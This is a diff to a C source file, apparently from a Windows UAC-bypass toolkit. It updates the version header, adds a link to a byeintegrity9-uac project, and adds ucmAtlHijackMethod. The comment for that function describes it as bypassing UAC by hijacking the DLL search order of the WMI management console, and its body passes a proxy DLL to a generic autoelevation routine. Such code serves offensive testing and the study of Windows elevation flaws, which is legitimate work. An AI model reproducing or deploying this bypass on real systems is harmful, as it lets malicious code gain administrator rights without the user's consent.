@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2020 - 2022
+*  (C) COPYRIGHT AUTHORS, 2020 - 2024
 *
 *  TITLE:       AZAGARAMPUR.C
 *
-*  VERSION:     3.63
+*  VERSION:     3.64
 *
-*  DATE:        16 Jul 2022
+*  DATE:        04 Feb 2023
 *
 *  UAC bypass methods from AzAgarampur.
 *
@@ -19,6 +19,7 @@
 *  https://github.com/AzAgarampur/byeintegrity-lite
 *  https://github.com/AzAgarampur/byeintegrity7-uac
 *  https://github.com/AzAgarampur/byeintegrity8-uac
+*  https://github.com/AzAgarampur/byeintegrity9-uac
 *
 * THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
 * ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
@@ -2311,4 +2312,27 @@ NTSTATUS ucmNICPoisonMethod2(
         supSetGlobalCompletionEvent();
 
     return MethodResult;
+}
+
+/*
+* ucmAtlHijackMethod
+*
+* Purpose:
+*
+* Bypass UAC by abusing search order of WMI management console dependency dll.
+*
+*/
+NTSTATUS ucmAtlHijackMethod(
+    _In_opt_ LPCWSTR lpTargetApp,
+    _In_ LPCWSTR lpTargetDll,
+    _In_ PVOID ProxyDll,
+    _In_ DWORD ProxyDllSize
+)
+{
+    return ucmGenericAutoelevationEx(lpTargetApp,
+        lpTargetDll,
+        WMIMGMT_MSC,
+        WBEM_DIR,
+        ProxyDll,
+        ProxyDllSize);
 }
